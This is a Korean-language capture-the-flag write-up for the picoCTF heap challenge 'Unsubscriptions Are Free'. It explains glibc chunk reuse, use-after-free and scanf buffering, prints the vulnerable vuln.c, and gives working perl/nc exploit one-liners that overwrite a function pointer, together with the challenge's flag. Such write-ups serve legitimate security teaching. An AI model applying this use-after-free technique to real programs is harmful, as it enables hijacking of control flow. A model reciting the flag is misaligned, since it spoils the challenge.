@@ -1,0 +1,623 @@
+		Unsubscriptions Are Free:
+	GLIBC malloc에서 같은 주소를 할당받는 방법과
+	scanf-read system call 간 차이
+
+
+				Problem	AUTHOR: THESHELL
+				Article Author: Kown Young Jung
+
+
+
+---[ Contents
+	1. Unsubscriptions Are Free
+	2. 문제에서 제시된 자료
+	3. GLIBC malloc에서 같은 주소를 할당받는 방법
+	4. scanf-read system call 간 차이
+	5. 부록 - vuln.c
+
+
+
+
+ 
+1. Unsubscriptions Are Free
+ 문제와 힌트는 각각 다음과 같이 제시된다.
+
+=============================================================
+Check out my new video-game and spaghetti-eating streaming
+channel on Twixer! [program] and get a flag. [source]
+nc mercury.picoctf.net 61817
+
+Hint: http://homes.sice.indiana.edu/yh33/Teaching/
+I433-2016/lec13-HeapAttacks.pdf
+=============================================================
+
+picoCTF에 있는 다른 문제와 같이, 이 문제도 주어진 주소에
+원격으로 접속하여 풀어야 한다. 주어진 코드는 156 라인의 길이를
+가지기 때문에 여기에 기술하기에는 너무 크다. 따라서 부록에
+복사해놓을 것이다.
+
+2. 문제에서 제시된 자료
+ 먼저 문제에서 제시된 vuln.c 코드를 보도록 하자. 이 파일의
+동작은 대략적으로 다음과 같이 정리할 수 있을 것이다.
+
+=============================================================
+ - user 할당(함수 포인터와 문자 포인터가 멤버로 존재함)
+ - processInput() 함수에서 문자를 읽어들이고 관련 함수를
+   (*whatToDo)()에 대입
+ - doProcess() 함수가 함수 포인터에 대입된 주소의 함수를
+   실행
+=============================================================
+
+ Hint에 제시된 자료는 32 비트 시스템에서의 format string 취약점,
+Heap에 존재하는 함수 포인터가 문자열에 인접한 경우, 그리고
+Double Free 취약점을 다루고 있다. Heap에 존재하는 함수
+포인터가 문자열에 인접한 경우와 코드를 참고하여 몇 가지
+시나리오를 생각할 수 있을 것이다.
+
+=============================================================
+ 1.	linep를 오버플로우 시켜서 user를 덮어쓰는 방법
+ 2.	s를 입력하여 hahaexploitgobrr 함수의 주소를 추출하고,
+	입력에서 오버플로우 코드에 포함시켜 함수 포인터가
+	가리키는 주소를 앞서 추출한 주소로 변경한다.
+ 3.	먼저 user를 free 시키고 linep를 할당하도록 만든 후에
+	다시 main 함수를 시작하도록 만들면 어떨까?
+=============================================================
+
+ 위의 시나리오는 전부 말도 안되는 이상한 생각이라는 것은 코드를
+통해 드러난다. 첫 번째 시나리오의 경우, linep는 기존에 설정된
+값보다 큰 입력이 들어오게 되면 realloc 함수로 그 크기를 늘리기
+때문에 오버플로우가 어렵다. 그리고 두 번째는 그나마 가능성이
+있지만 힙은 낮은 주소에서 높은 주소로 자라므로 오버플로우
+시킨다고 해도 덮어쓸 수 있는 가능성은 낮다. 마지막으로 세 번째는
+main 함수를 다시 호출하도록 함수의 return address를 변경할 수
+있는 부분을 찾는 것이 매우 어렵다. 이제 다시 Hint의 자료를
+보도록 하자. 관심을 가져야할 부분은 Double Free를 설명하는
+지면이 될 것이다. 이는 C 언어에서의 동적 메모리
+관리(Dynamic Memory Management) 함수들을 설명하는 것으로
+시작한다. 그리고 관리 과정에서 발생하는 취약점으로 귀결될 수
+있는 에러들을 확인하고 GLIBC에서 사용되는 malloc 함수의 동작을
+살펴본다. 마지막으로 malloc/free 과정에서 발생가능한 상황을
+다루고 예제 코드와 실제 사례를 제시하며 마무리 짓는다. 여기서는
+이 자료의 내용을 매우 간략히 다룰 것이다.
+ GLIBC의 malloc 함수가 기반을 두는 Doug Lea's malloc(dlmalloc)
+의 chunk들은 double linked list로 연결된다. Double linked list에
+사용되는 포인터들은 할당된 시점에는 사용되지 않고 free된
+chunk에서만 사용된다. 여기서 free list에서 chunk를 link/unlink
+시키는 macro는 다음과 같이 정의된다.
+
+----------
+link macro
+=============================================================
+/* 
+ * link a chunk P to the free list pointed by bin
+ *
+ * fd: foward pointer to next
+ * bk: back pointer to prev
+ */
+#define link(bin, P) {
+	chk = bin->fd;
+	bin->fd = P;
+	p->fd = chk;
+	chk->bk = P;
+	P->bk = bin;
+}
+=============================================================
+
+------------
+unlink macro
+=============================================================
+/* unlink a chunk P from the free list */
+#define unline(P, BK, FD) {
+	FD = P->fd;
+	BK = P->bk;
+	FD->bk = BK;
+	BK->fd = FD;
+}
+=============================================================
+
+여기서 비어있는 free list와 한 chunk가 할당되어 있는 경우를
+생각해보자. 이미 할당되어있는 chunk가 free된다면 link macro에
+의해 다음과 같을 것이다.
+
+bin -> +-----+
+ +---> |__fd_|----> +-----------------------------------------+
+ |     |__bk_|----> | size of prev chunk, if unallocated |<- P|
+ |                  +-----------------------------------------+
+ |                  | size of chunk, in bytes               |P|
+ |                  +-----------------------------------------+
+ +------------------| foward pointer to next chunk            |
+ |                  +-----------------------------------------+
+ +------------------| back pointer to previous chunk          |
+                    +-----------------------------------------+
+                    | unused space                            |
+                    +-----------------------------------------+
+                    | size of chunk                           |
+                    +-----------------------------------------+
+		Fig 1. After First Call to free()
+
+그리고 같은 chunk에 대한 두 번째 free() 함수가 호출되면 link
+macro에 의해 다음이 성립한다.
+
+	chk = bin->fd(== P)
+	bin->fd = P
+	P->fd = chk(== P)
+	chk->bk(== P->bk) = P
+	P->bk = bin
+
+즉, P의 fd, bk 포인터가 다른 chunk가 아닌 자신을 가리키게 된다.
+
+bin -> +-----+
+           |__fd_|---->  +------------------------------------+
+           |__bk_|--+-> | size of prev chunk, if unallocated |<- P
+                          |    +------------------------------------+
+                |   | size of chunk, in bytes          |P|
+                |   +------------------------------------+
+ 		+---| foward pointer to next chunk       |
+                |   +------------------------------------+
+                +---| back pointer to previous chunk     |
+                    +------------------------------------+
+                    | unused space                       |
+                    +------------------------------------+
+                    | size of chunk                      |
+                    +------------------------------------+
+		Fig 2. After Second Call to free()
+
+이런 상황에서 malloc 함수가 호출되었다고 생각해보자. 그럼 해당
+chunk는 free list에서 unlink 되어야 한다. 따라서 unlink 매크로에
+의해 다음이 성립한다.
+
+	FD = P->fd(== P)
+	BK = P->bk(== P)
+	FD->bk(== P->bk) = BK
+	BK->fd(== P->fd) = FD
+
+위 과정은 간단히 말해 어떤 변화도 발생시키지 않는다. P는 여전히
+free list에 존재한다. 하지만 P는 새로운 메모리 공간으로
+반환된다. 따라서 P의 fd와 bk 부분부터 user data가 쓰여진다.
+이때 malloc 함수가 한 번더 호출되면 어떻게 될까? 이 경우에
+chunk P가 아직 free list에 존재하기 때문에 이에 대한 unlink를
+시도할 것이다. 그리고 P의 fd, bk는 가용한 chunk를 가리키는
+포인터로 사용되기 때문에 그렇게 인식될 것이다. 하지만 앞서
+살펴보았듯이 unlink는 실패한다. 따라서 같은 chunk가 반환된다.
+ 해당 자료는 Double Free를 통해 chunk의 값을 변조할 수 있음을
+보이고 있다. 이는 자료가 제시된 문제에도 적용시킬 수 있을
+것이다. 그러나 user와 linep의 주소는 같지 않다. 아무리 user를
+free 하고 linep를 할당하는 함수를 호출하여도 주소는 다르다.
+아무래도 Double Free에 대해 좀 더 알아볼 필요가 있다. 그리고
+확실한 것은 어떻게든 user가 가리키는 주소에 값을 쓸 수 있어야
+한다는 것이다.
+
+3. GLIBC malloc에서 같은 주소를 할당받는 방법
+ 최근 GLIBC malloc 함수에는 Double Free에 대한 방어 매커니즘이
+적용되어 있다. 따라서 같은 주소에 대한 연속적인 free 함수의
+호출은 프로그램을 종료시킨다. 하지만 다음 코드는 정상적으로
+실행되는 것으로 보인다.
+
+---------
+example.c
+=============================================================
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	char *a, *b;
+
+	a = malloc(128);
+	printf("Allocated a: %p\n", a);
+	free(a);
+	b = malloc(128);
+	printf("Allocated b: %p\n", b);
+	free(a);
+	return 0;
+}
+=============================================================
+
+분명 위 코드에서 a에 대한 Double Free가 발생하였다. 하지만
+에러는 나타나지 않았다. 위 코드의 결과를 보도록 하자.
+
+-------------------
+result of example.c
+=============================================================
+a: 0x564cbb0c7260
+b: 0x564cbb0c7260
+=============================================================
+
+즉, 코드 상으로는 Double Free가 발생하였지만 실행 상에서 free
+함수의 입장에서는 그저 한 메모리가 할당되었다가 해제되고
+다시 할당된 뒤 다시 해제된 것에 불과하다. 다시 말해 위 코드의
+두 번째 free(a);는 실질적으로 free(b);와 다를 것이 없다. 그럼
+왜 a = b가 성립하는 것일까? 그 이유는 같은 크기의 메모리를
+malloc에게 요청하였기 때문이다. 그렇기 때문에 첫 번째로
+할당하고 해제된 메모리는 두 번째 할당 시에 allocater가 찾는
+메모리에 딱 맞는다는 특성을 가진다. 따라서 두 번째로 할당할
+때 malloc은 또다른 chunk를 굳이 검색하지 않고 이전에 같은 크기로
+할당해주었고 지금은 free list에 존재하는 메모리의 주소를
+반환한다.
+ 이는 user와 linep의 주소가 다른 이유를 설명한다. user는
+멤버 변수가 두 개 뿐이고 둘다 배열이 아닌 포인터이기 때문에
+그 크기는 linep의 크기인 100 바이트보다 작다. 따라서 user를
+free 하여도 linep의 크기에 맞는 메모리를 할당해주기 위해
+malloc은 다른 chunk를 검색하게되고 결과적으로 다른 주소를
+반환한다. 그렇다면 user의 크기는 얼마일까? user는 두 개의
+포인터로 구성된다. 그리고 주어진 프로그램은 32 비트 상에서
+동작하는 프로그램이므로 4 바이트 * 2 = 8 바이트로 추정할 수
+있다. 그리고 주어진 코드에서 malloc(8);이 위치하는 곳은
+leaveMessage() 함수이다. 이로부터 다음과 같은 시나리오를
+구성할 수 있다.
+
+=============================================================
+1. haha...함수의 주소는 실행파일을 objdump로 열어서 추출
+2. 프로그램을 실행하고 user를 free 시킴
+3. leaveMessage() 함수를 호출하여 malloc으로 다시 할당
+4. leaveMessage()의 read syscall에서 추출한 함수의 주소를 입력
+=============================================================
+
+이제 위의 시나리오를 구체적으로 기술해보자. 먼저 haha...함수의
+주소는 프로그램을 실행한 후 (S)ubscribe to my channel 메뉴를
+선택하여 추출할 수도 있고 objdump로 파일을 열어서 추출할 수도
+있다.
+
+-----------------------
+haha...함수의 주소 추출
+=============================================================
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+s
+OOP! Memory leak...0x80487d6
+Thanks for subsribing! I really recommend becoming a
+premium member!
+
+080487d6 <hahaexploitgobrrr>:
+ 80487d6:       55                      push   %ebp
+ 80487d7:       89 e5                   mov    %esp,%ebp
+ 80487d9:       53                      push   %ebx
+ 80487da:       81 ec d4 00 00 00       sub    $0xd4,%esp
+...
+=============================================================
+
+그리고 user를 free시키기 위해서는 (I)nquire about account
+deletion을 선택하고 후의 질문에 y를 선택해야 한다. 또,
+leaveMessage() 함수를 실행시키는 메뉴는 (l)eave a message(with
+or without logging in)이다. 이로부터 다음과 같은 스크립트를
+작성할 수 있다.
+
+----------
+exploit.sh
+=============================================================
+#!/bin/bash
+
+perl -e 'print "iyl" . "\xd6\x87\x04\x08"' | ./vuln
+=============================================================
+
+그러나 위 코드는 Segmentation fault만 일으킬 뿐 제대로
+동작하지 않는다. 실패하는 원인을 찾기 위해 strace로 분석해보자.
+
+-----------------
+exploit_strace.sh
+=============================================================
+#!/bin/bash
+
+perl -e 'print "iyl" . "\xd6\x87\x04\x08"' | strace -i ./vuln
+=============================================================
+
+위 코드를 실행하고 Segfault가 발생한 부분을 보면 다음을
+확인할 수 있다.
+
+=============================================================
+...
+[f76eeba9] read(0, "", 8)               = 0
+[00000000] --- SIGSEGV {si_signo=SIGSEGV
+...
+=============================================================
+
+이는 마지막 read syscall에서 읽어들인 것이 아무것도 없고 그에
+따라 user의 whatToDo도 설정되지 않았고 따라서 NULL 주소로
+점프하게 되어 Segmentation fault가 발생한 것으로 보인다.
+그런데 왜 마지막 read syscall은 읽어들인 것이 없는 것일까?
+이는 마치 C를 다루던 초기에, 도서관 프로그램을 작성할 때
+두 개의 scanf 중 하나만 입력을 받고 다른 하나는 무시되어 입력을
+받지 못하는 현상과 비슷해보인다.
+
+4. scanf-read system call 간 차이
+ The C Programming Language Chapter 8에 제시된 것처럼 C의 표준
+입출력에 관한 라이브러리는 system call의 빈번한 호출을 막기 위해
+버퍼를 사용하며 버퍼에 아무것도 없다면 syscall로 이를 채우고
+그 후에는 버퍼에서 꺼내는 것만으로 동작할 수 있도록 작성되는
+경우가 많다. 그리고 버퍼를 채울 때는 trade-off를 적절히 반영한
+크기를 선택하며 그 크기는 주로 1024, 4096 바이트 등이다. 이를
+문제에 적용시켜보자. 그럼 다음과 같은 순서로 쓸 수 있다.
+
+=============================================================
+1. scanf 호출
+	1-1. scanf 내 read 호출
+	1-2. bash 명령어에서 전달된 모든 입력을 읽어들임
+	1-3. scanf는 한 문자만을 주어진 인자의 주소에 저장
+2. 두 번째 scanf 호출
+	2-1. scanf는 버퍼에서 한 문자만을 주어진 인자의 주소에
+	저장
+3. 세 번째 scanf 호출
+	3-1. scanf는 버퍼에서 한 문자만을 주어진 인자의 주소에
+	저장
+4. read 호출
+	4-1. read는 읽어들일 입력이 없으므로 0을 반환
+=============================================================
+
+위의 1-2.에서 bash 명령어에서 전달된 "모든" 입력을 읽어들인다는
+것을 눈여겨 보도록 하자. 즉, scanf의 read에서 후의 read를 위해
+전달한 함수의 주소까지 읽어들여버렸기 때문에 후의 read는
+읽어들일 입력이 없는 것이다. 따라서 user의 함수 포인터는
+설정되지 않고 Segfault만 일으키고 프로그램은 종료된다. 이를
+해결하기 위해서는 첫 번째 read에게 버퍼가 다 찰만큼의 충분한
+입력을 주어야 한다. read가 한 번에 읽어들이는 크기는 시스템마다
+다를 수 있기 때문에 strace로 확인해볼 필요가 있다.
+
+=============================================================
+...
+[f76eeba9] read(0, "iyl\326\207\4\10", 4096) = 7
+...
+=============================================================
+
+이로부터 버퍼의 크기는 4096 바이트임을 확인할 수 있다. 그럼
+코드는 다음과 같이 수정하면 될 것이다.
+
+----------
+exploit.sh
+=============================================================
+#!/bin/bash
+
+perl -e 'print "iyl" . "A" x 4093 . "\xd6\x87\x04\x08"' | ./vuln
+=============================================================
+
+여기서 이 스크립트를 실행하기 전에 haha... 함수는 flag.txt
+파일로부터 내용을 읽어들이는 코드가 포함되어 있기 때문에
+flag.txt 라는 이름의 파일을 미리 만들어두어야 한다.
+
+=============================================================
+-------[flag.txt
+This is the flag for you. Congratulations!!
+]-------
+
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+You're leaving already(Y/N)?
+Bye!
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+I only read premium member messages but you can
+try anyways:
+This is the flag for you. Congratulations!!
+
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+Invalid option!
+=============================================================
+
+이렇게 스크립트가 성공적으로 동작한 것을 볼 수 있다. 그럼 이제
+마지막으로 해야할 것은 이를 picoCTF에서 제시한 원격 주소에
+전달하는 것이다. 그에 대한 스크립트는 다음과 같다.
+
+----------
+exploit.sh
+=============================================================
+#!/bin/bash
+
+perl -e 'print "iyl" . "A" x 4093 . "\xd6\x87\x04\x08"' | \
+	nc mercury.picoctf.net 61817
+=============================================================
+
+그 결과로 다음과 같이 FLAG를 얻을 수 있다.
+
+=============================================================
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+You're leaving already(Y/N)?
+Bye!
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+I only read premium member messages but you can
+try anyways:
+picoCTF{d0ubl3_j30p4rdy_1e154727}
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+Invalid option!
+=============================================================
+
+5. 부록 - vuln.c
+=============================================================
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <ctype.h>
+
+#define FLAG_BUFFER 200
+#define LINE_BUFFER_SIZE 20
+
+
+typedef struct {
+	uintptr_t (*whatToDo)();
+	char *username;
+} cmd;
+
+char choice;
+cmd *user;
+
+void hahaexploitgobrrr(){
+ 	char buf[FLAG_BUFFER];
+ 	FILE *f = fopen("flag.txt","r");
+ 	fgets(buf,FLAG_BUFFER,f);
+ 	fprintf(stdout,"%s\n",buf);
+ 	fflush(stdout);
+}
+
+char * getsline(void) {
+	getchar();
+	char * line = malloc(100), * linep = line;
+	size_t lenmax = 100, len = lenmax;
+	int c;
+	if(line == NULL)
+		return NULL;
+	for(;;) {
+		c = fgetc(stdin);
+		if(c == EOF)
+			break;
+		if(--len == 0) {
+			len = lenmax;
+			char * linen = realloc(linep, lenmax *= 2);
+
+			if(linen == NULL) {
+				free(linep);
+				return NULL;
+			}
+			line = linen + (line - linep);
+			linep = linen;
+		}
+
+		if((*line++ = c) == '\n')
+			break;
+	}
+	*line = '\0';
+	return linep;
+}
+
+void doProcess(cmd* obj) {
+	(*obj->whatToDo)();
+}
+
+void s(){
+ 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
+ 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
+}
+
+void p(){
+  	puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)");
+}
+
+void m(){
+	puts("Account created.");
+}
+
+void leaveMessage(){
+	puts("I only read premium member messages but you can ");
+	puts("try anyways:");
+	char* msg = (char*)malloc(8);
+	read(0, msg, 8);
+}
+
+void i(){
+	char response;
+  	puts("You're leaving already(Y/N)?");
+	scanf(" %c", &response);
+	if(toupper(response)=='Y'){
+		puts("Bye!");
+		free(user);
+	}else{
+		puts("Ok. Get premium membership please!");
+	}
+}
+
+void printMenu(){
+ 	puts("Welcome to my stream! ^W^");
+ 	puts("==========================");
+ 	puts("(S)ubscribe to my channel");
+ 	puts("(I)nquire about account deletion");
+ 	puts("(M)ake an Twixer account");
+ 	puts("(P)ay for premium membership");
+	puts("(l)eave a message(with or without logging in)");
+	puts("(e)xit");
+}
+
+void processInput(){
+  scanf(" %c", &choice);
+  choice = toupper(choice);
+  switch(choice){
+	case 'S':
+	if(user){
+ 		user->whatToDo = (void*)s;
+	}else{
+		puts("Not logged in!");
+	}
+	break;
+	case 'P':
+	user->whatToDo = (void*)p;
+	break;
+	case 'I':
+ 	user->whatToDo = (void*)i;
+	break;
+	case 'M':
+ 	user->whatToDo = (void*)m;
+	puts("===========================");
+	puts("Registration: Welcome to Twixer!");
+	puts("Enter your username: ");
+	user->username = getsline();
+	break;
+   case 'L':
+	leaveMessage();
+	break;
+	case 'E':
+	exit(0);
+	default:
+	puts("Invalid option!");
+	exit(1);
+	  break;
+  }
+}
+
+int main(){
+	setbuf(stdout, NULL);
+	user = (cmd *)malloc(sizeof(user));
+	while(1){
+		printMenu();
+		processInput();
+		//if(user){
+			doProcess(user);
+		//}
+	}
+	return 0;
+}
+=============================================================
